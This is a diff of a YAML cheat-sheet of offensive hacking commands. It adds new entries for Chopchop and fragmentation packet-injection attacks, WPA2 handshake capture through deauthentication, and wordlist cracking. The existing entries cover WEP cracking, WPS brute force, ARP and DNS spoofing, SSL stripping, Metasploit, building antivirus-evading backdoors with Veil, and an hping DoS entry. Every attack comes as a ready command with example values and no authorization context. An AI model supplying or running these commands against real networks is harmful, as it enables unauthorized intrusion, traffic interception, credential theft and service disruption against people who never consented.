@@ -1,6 +1,7 @@
 - title: Display available network interfaces
   description: Display all the available network interfaces
   category: NetworkHacking
+  type: command
   content: >-
     This command will show all the available network interfaces in your computer
   commands:
@@ -11,6 +12,7 @@
 - title: Display available wireless interfaces
   category: NetworkHacking
   description: Display available wireless interfaces
+  type: command
   content: >-
     This command will display all the available wireless interfaces in your
     computer.
@@ -22,6 +24,7 @@
 - title: Disable a network
   category: NetworkHacking
   description: Command used to disable a network interface in your computer
+  type: command
   content: >-
     This command will disable a network interface in your computer, useful when
     changing a value that requires to restart an interface.
@@ -33,6 +36,7 @@
 - title: Activate a network
   category: NetworkHacking
   description: Command used to activate a disabled network interface in your computer
+  type: command
   content: >-
     This command will activate a network interface in your computer, if you
     disabled an interface, use this command to activate it again.
@@ -44,6 +48,7 @@
 - title: Change an interface's MAC address
   category: NetworkHacking
   description: Command used to change a network interface's MAC address
+  type: command
   content: >-
     This command will change the MAC address (in RAM) of a network interface in
     your computer, useful for bypassing blacklists, impersonating devices,
@@ -56,6 +61,7 @@
 - title: Prepare an interface to be used as monitor mode
   category: NetworkHacking
   description: This command will kill any process that could interfere an interface's execution in Monitor Mode.
+  type: command
   content: >-
     This command will kill processes that could interefere an interface's
     execution in monitor mode.
@@ -67,6 +73,7 @@
 - title: Set an interface in monitor mode
   category: NetworkHacking
   description: Sets an interface in monitor mode
+  type: command
   content: >-
     Use this command to set an interface in monitor mode, that is, to receive
     any packet that is sent through the air within its range, even if its
@@ -81,6 +88,7 @@
 - title: Packet Sniffing
   category: NetworkHacking
   description: Get detailed information from near networks
+  type: command
   content: >-
     Get detailed information about networks in your range, get their connected
     clients and their MAC addresses, network's execution channel, etcetera.
@@ -92,6 +100,7 @@
 - title: Packet Sniffing on 5GHz networks
   category: NetworkHacking
   description: Sniffs packets and gets detailed information about near 5GHz networks only
+  type: command
   content: >-
     By default, airodump-ng only works/sniffs on 2.4GHz networks, to
     execute airodump-ng against 5GHz networks, execute:
@@ -103,6 +112,7 @@
 - title: Packet Sniffing on 2.4GHz networks only
   category: NetworkHacking
   description: Sniffs packets and gets detailed information about near 2.4GHz networks only
+  type: command
   content: >-
     This is the default type of scan that airodump-ng performs.
   commands:
@@ -113,6 +123,7 @@
 - title: Packet Sniffing on both 2.4GHz and 5GHz networks
   category: NetworkHacking
   description: Sniffs packets and gets detailed information about near 2.4 and 5 GHz networks
+  type: command
   content: >-
     By executing this command, you will sniff on both 2.4 and 5GHz networks,
     note that this scan is slowe, so... Instead on sniffing on both bands, I'd
@@ -125,6 +136,7 @@
 - title: Packet sniffing on target networks
   category: NetworkHacking
   description: Sniffs packets and gets even more detailed information about a specified network
+  type: command
   content: >-
     With this command you can sniff packets on just one network and get even
     more detailed information.
@@ -136,9 +148,10 @@
 - title: Store the airodump-ng captured data on a file
   category: NetworkHacking
   description: Store the airodump-ng captured data on a file
+  type: command
   content: >-
     With this command you can store the airodump's captured data into a file,
-    useful when captured a networ's handshake or cracking WEP networks.
+    useful when captured a network's handshake or cracking WEP networks.
   commands:
     - airodump-ng --write [FileNameToWrite] [InterfaceInMonitorMode]
   example:
@@ -147,6 +160,7 @@
 - title: Deauthentication attack
   category: NetworkHacking
   description: Deauthenticates a client from a network
+  type: command
   content: >-
     This command will allow you to deauthenticate any client on a target network
   commands:
@@ -157,6 +171,7 @@
 - title: Crack WEP
   category: NetworkHacking
   description: Cracks a network's access password whose encryption is WEP
+  type: command
   content: >-
     With this command you can crack a network whose encryption is WEP, take into
     account that you'll need a cap file (can be retrieved from airodump-ng) with
@@ -169,6 +184,7 @@
 - title: Fake Authentication Attack
   category: NetworkHacking
   description: Lets you authentication to any network
+  type: command
   content: >-
     With this command you can authenticate your wireless adapter to any network,
     this is useful when performing a deauthentication attack.
@@ -177,9 +193,10 @@
   example:
     - aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h 00:12:34:56:78:89 wlp2s0mon
 
-- title: ARP Replay
+- title: Packet Injection - ARP Replay
   category: NetworkHacking
   description: Captures an ARP packet and resends it so the network is forced to generate more IVs
+  type: command
   content: >-
     Captures an ARP packet and replays it so the network is forced to generate
     more IVs, useful when cracking an idle WEP network.
@@ -188,9 +205,49 @@
   example:
     - aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h 00:12:34:45:56:78 wlp2s0mon
 
+- title: Packet Injection - Chopchop Attack
+  category: NetworkHacking
+  description: Tries to determine the IV by the sent packets to forge a fake one and inject it into the target network to generate traffic
+  type: command:
+  content: >-
+    The Chopchop attack works a little like the ARP replay attack, it will need to capture some packets
+    to determine the IV so it can be used to forge a fake packet and that packet will be injected into
+    the target network so we generate traffic in it to crack its WEP password.
+
+    We specify `-0` in packetforge so we create a fake ARP packet and `-y` to specify the name of
+    the keystream file generated by aireplay-ng, and then we inject that package with the third command.
+
+    Take in account that you need to keep associating between commands so the target network doesn't
+    ignore you.
+  commands:
+    - aireplay-ng --chopchop -b [NetworkBSSID] -h [InterfaceInMonitorModeMAC] [InterfaceInMonitorMode]
+    - packetforge-ng -0 -a [NetworkBSSID] -h [InterfaceInMonitorModeMAC] -k [DestinationIP] -l [SourceIP] -y [KeystreamFile] -w [PacketName]
+    - aireplay-ng -2 -r [FakePacketFileName] [InterfaceInMonitorMode]
+  example:
+    - aireplay-ng --chopchop -b 00:11:22:33:44:55 -h 00:12:34:56:67:78 wlan0mon
+    - packetforge-ng -0 -a 00:11:22:33:44:55 -h [00:12:34:56:78] -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w chopchop-forged-packet
+    - aireplay-ng -2 -r chopchop-forget-packet wlan0mon
+
+- title: Packet Injection - Fragmentation Attack
+  category: NetworkHacking
+  description: Obtains PRGA, forges a new - fake - packet and it's injected into the target network to generate traffic
+  type: command
+  content: >-
+    The goal of this method is to obtain 1500 bytes of the PRGA (pseudo random generation algorithm), this
+    can be used to forge a new packet which can be injected into the traffic to generate new IV's.
+  commands:
+    - aireplay-ng --fragment -b [NetworkBSSID] -h [InterfaceInMonitorModeMac] [InterfaceInMonitorMode]
+    - packetforge-ng -0 -a [NetworkBSSID] -h [InterfaceInMonitorModeMAC] -k 255.255.255.255 -l 255.255.255.255 -y [KeystreamFile] -w [PacketName]
+    - aireplay-ng -2 -r [FakePacketFileName] [InterfaceInMonitorMode]
+  example:
+    - aireplay-ng --fragment -b 00:11:22:33:44:55 -h 00:12:34:56:78 wlan0mon
+    - packetforge-ng -0 -a 00:11:22:33:44:55 -h 00:12:34:56:78 -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w chop-out
+    - aireplay-ng -2 -r chop-out wlan0mon
+
 - title: Display networks with WPS enabled
   category: NetworkHacking
   description: Display networks with WPS enabled
+  type: command
   content: >-
     With this command you cna get all of the networks near you that has the WPS
     feature enabled so you can try to bruteforce it later.
@@ -202,6 +259,7 @@
 - title: WPS Bruteforce
   category: NetworkHacking
   description: Bruteforces a network's WPS PIN
+  type: command
   content: >-
     With this command you can bruteforce a network's WPS PIN, use ful when
     trying to gain access to a network and that network uses WPS. It would let
@@ -214,6 +272,7 @@
 - title: WPS Bruteforce without authentication
   category: NetworkHacking
   description: Bruteforces a WPS PIN Without authenticating to the network
+  type: command
   content: >-
     Usually, when bruteforcing a WPS PIN with reaver, it will automatically
     authenticate you to the network, if you don't want it to happen you can
@@ -224,9 +283,41 @@
   example:
     - reaver --bssid 00:11:22:33:44:55 --channel 1 -vvv --no-associate --interface wlp2s0mon
 
+- title: Capturing the handshake of a WPA2 network
+  category: NetworkHacking
+  description: Gets the handshake of a WPA2 network
+  type: command
+  content: >-
+    The handshake is a file that, doesn't contain the password - or something that lets us get it - of a WPA2 network as it was
+    with WEP, but it's something that will help us determine if a password is correct or if it is wrong. The handshakes are
+    necessary to performing bruteforce attacks.
+
+    First, we have to sniff the packets of our target network, then we have to deauthenticate any connected client to the
+    network (with 4 packets it'd be enough to get the handshake) and once the client connects back to the network, on the top
+    right side of the airodump-ng output, you'll see "WPA Handshake", meaning the handshake was captured successfully.
+  commands:
+    - airodump-ng --bssid [NetworkBSSID] --channel [NetworkChannel] --write [OutputFile] [Interface]
+    - aireplay-ng --deauth 4 -a [NetworkBSSID] -c [ClientBSSID] wlan0mon
+  example:
+    - airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write wpa_handshake wlan0mon
+    - aireplay-ng --deauth 4 -a 00:11:22:33:44:55 -c 00:12:34:56:78 wlan0mon
+
+- title: WPA2 Wordlist attack
+  category: NetworkHacking
+  description: Performs a bruteforce attack to a WPA2 network
+  type: command
+  content: >-
+    Performs a bruteforce attack on a WPA2 network (take in account you need both the handshake and a dictionary) in order to
+    perform this attack.
+  commands:
+    - aircrack-ng [HandshakeFile] -w [Wordlist]
+  example:
+    - aircrack-ng wpa_handshake-01.cap -w wordlist.txt
+
 - title: See the connected devices to our network
   category: NetworkHacking
   description: Discover the connected devices in your network using netdiscover
+  type: command
   content: >-
     With the following command you can get all the connected devices to your
     network, this includes its MAC an IP Addresses and potentially its vendor.
@@ -238,6 +329,7 @@
 - title: NMap - Ping Scan
   category: NetworkHacking
   description: Performs a ping scan using nmap
+  type: command
   content: >-
     With this scan, you can get all of the IP addresses of the clients connected
     to your network.<br><br>
@@ -247,12 +339,13 @@
   commands:
     - nmap -sn [IP/Range]
   example:
-    - nmap -sn 192.168.1.1/24
+    - nmap -sn 192.168.1.0/24
     - nmap -sn 192.168.1.10
 
 - title: NMap - Fast scan
   category: NetworkHacking
   description: Performs a fast scan using NMap
+  type: command
   content: >-
     Performs a Fast scan using NMap. A Fast scan includes IP address and open
     ports.
@@ -265,6 +358,7 @@
 - title: NMap - Fast scan plus
   category: NetworkHacking
   description: Performs a Fast Scan Plus using NMap
+  type: command
   content: >-
     Performs a Fast Scan Plus using NMap. A fast scan includes open ports, IP
     address, operating system and more information about the service running on
@@ -278,6 +372,7 @@
 - title: ARP Spoofing using arpspoof
   category: NetworkHacking
   description: Performs an ARP Spoofing attack using arpspoof
+  type: command
   content: >-
     Perform an ARP Spoofing (also known as Man In The Middle) attack using a
     tool called "arpspoof".<br><br>
@@ -293,6 +388,7 @@
 - title: Bettercap - Open bettercap
   category: NetworkHacking
   description: Opens Bettercap
+  type: command
   content:
   commands:
     - bettercap -iface [InterfaceConnectedToTheNetwork]
@@ -302,6 +398,7 @@
 - title: Bettercap - Opens with a caplet
   category: NetworkHacking
   description: Open bettercap with a caplet
+  type: command
   content: >-
     Opens bettercap with a caplet (a file containing commands so they get
     executed automatically once bettercap is started)
@@ -313,6 +410,7 @@
 - title: Bettercap - net.probe
   category: NetworkHacking
   description: Discover all connected clients to your network
+  type: command
   content: >-
     This module lets you discover all the connected clients on your current
     network.
@@ -326,6 +424,7 @@
 - title: Bettercap - Show discovered clients
   category: NetworkHacking
   description: Shows the discovered connected clients in your network
+  type: command
   content: >-
     This command will show all the previously connected clients in your network
     using `net.probe`.
@@ -337,6 +436,7 @@
 - title: Bettercap - ARP Spoof
   category: NetworkHacking
   description: Performs an ARP Spoof attack using bettercap
+  type: command
   content: >-
     This module will allow you to perform an arp spoofing attack using
     bettercap.<br>
@@ -356,6 +456,7 @@
 - title: Bettercap - Sniff packets
   category: NetworkHacking
   description: Sniff packets using Bettercap
+  type: command
   content: >-
     Sniffs packets using bettercap.<br><br>
     **Note**: In order for this attack to be successful, you'll need to be the
@@ -370,6 +471,7 @@
 - title: Bettercap - DNS Spoofing
   category: NetworkHacking
   description: Performs a DNS Spoofing attack using bettercap
+  type: command
   content: >-
     This module will allow you to execute a DNS Spoofing attack.
   commands:
@@ -386,6 +488,7 @@
 - title: Bettercap - Display caplets
   category: NetworkHacking
   description: Displays all the available caplets on Bettercap
+  type: command
   content: >-
     This command will show you all the available caplets on bettercap.<br><br>
     **Note**: In order to execute a caplet, you just need to type its name as
@@ -400,6 +503,7 @@
 - title: Bettercap - SSL Strip
   category: NetworkHacking
   description: Use bettercap to bypass SSL/HTTPS protection while being the man in the middle
+  type: command
   content: >-
     To bypass SSL you just need to execute the "hstshijack" caplet, to do that,
     just run:
@@ -411,6 +515,7 @@
 - title: Metasploit - Open
   category: DeviceHacking
   description: Opens Metasploit
+  type: command
   content: >-
     In order to open metasploit, all you have to do is type:
   commnds:
@@ -421,6 +526,7 @@
 - title: Metasploit - Use
   category: DeviceHacking
   description: Use a certain exploit, payload or auxiliary
+  type: command
   content: >-
     In order to select an exploit, a payload or an auxiliary, you have to write:
   commands:
@@ -431,6 +537,7 @@
 - title: Metasploit - Show
   category: DeviceHacking
   description: Displays information to the screen
+  type: command
   content: >-
     The `show` command in metasploit displays information about exploits,
     payloads, auxiliaries and options.
@@ -442,6 +549,7 @@
 - title: Metasploit - Set
   category: DeviceHacking
   description: Changes the value of an option
+  type: command  
   content: >-
     To change the value of an option in metasploit, all you have to do is write:
   commands:
@@ -452,6 +560,7 @@
 - title: Metasploit - Exploit
   category: DeviceHacking
   description: Runs the current exploit
+  type: command
   content: >-
     To run an exploit in metasploit, it's just necessary to write:
   commands:
@@ -462,6 +571,7 @@
 - title: Metasploit - Show payloads
   category: DeviceHacking
   description: Displays the available payloads for an exploit
+  type: command
   content: >-
     To see all the available payloads for an exploit, you just need to execute:
   commands:
@@ -472,6 +582,7 @@
 - title: Metasploit - Use payload
   category: DeviceHacking
   description: Sets a payload for the currently selected exploit
+  type: command
   content: >-
     To set a payload, execute:
   commands:
@@ -482,6 +593,7 @@
 - title: Veil - Open
   category: DeviceHacking
   description: Opens Veil
+  type: command
   content: >-
     Opens the Veil framework.
   commands:
@@ -494,6 +606,7 @@
 - title: Veil - List
   category: DeviceHacking
   description: List the available tools in Veil
+  type: command
   content: >-
     Lists the available tools in Veil.<br><br>
     **Evasion** is about making a backdoor undetectable by an antivirus and
@@ -506,6 +619,7 @@
 - title: Veil - Use
   category: DeviceHacking
   description: Determines the tool we are going to use
+  type: command
   content: >-
     By using `use` we can determine which tool we want to use.
   commands:
@@ -516,6 +630,7 @@
 - title: Veil Evasion - List
   category: DeviceHacking
   description: Shows the available payloads to use
+  type: command
   content: >-
     This command will show you the available payloads you can use.
   commands:
@@ -526,6 +641,7 @@
 - title: Veil Evasion - Use
   category: DeviceHacking
   description: Lets you choose what payload you will be using
+  type: command
   content: >-
     By using `use` you can set the payload you will be using.
   commands:
@@ -536,6 +652,7 @@
 - title: Veil Evasion - Set
   category: DeviceHacking
   description: Lets you change the value of a payload parameter
+  type: command
   content: >-
     The `set` keyword will let you modify the value of any parameter in a
     payload.
@@ -547,6 +664,7 @@
 - title: Veil Evasion - Options
   category: DeviceHacking
   description: Options shows you the available parameters in a payload
+  type: command
   content: >-
     This command will display all the options of the selected payload to the
     screen.
@@ -558,6 +676,7 @@
 - title: Veil Evasion - Generate
   category: DeviceHacking
   description: Generates the backdoor with all the set parameters
+  type: command
   content: >-
     This command will generate the current payload to an executable file
     (if set to do so).
@@ -569,6 +688,7 @@
 - title: Veil Evasion - Listen for incoming connections
   category: DeviceHacking
   description: Listens for incoming connections
+  type: command
   content: >-
     Once the victim opens the backdoor, we'll need to listen for an incoming
     connection in our computer. To do so, first open metasploit, load the
@@ -589,6 +709,7 @@
 - title: SYN scan with Hping
   category: NetworkHacking
   description: Scans a target and returns its open ports
+  type: command
   content: >-
     We can perform an active scan using hping on a target to get its opened
     ports and the name of the service they are running.
@@ -605,6 +726,7 @@
 - title: Xmas scan with Hping
   category: NetworkHacking
   description: Scans a target and returns its open ports
+  type: command
   content: >-
     Perform a Xman scan on a target.
   commands:
@@ -615,6 +737,7 @@
 - title: DoS attack with Hping
   category: NetworkHacking
   description: Performs a DoS attack using Hping
+  type: command
   content: >-
     Performs a DoS attack.
 
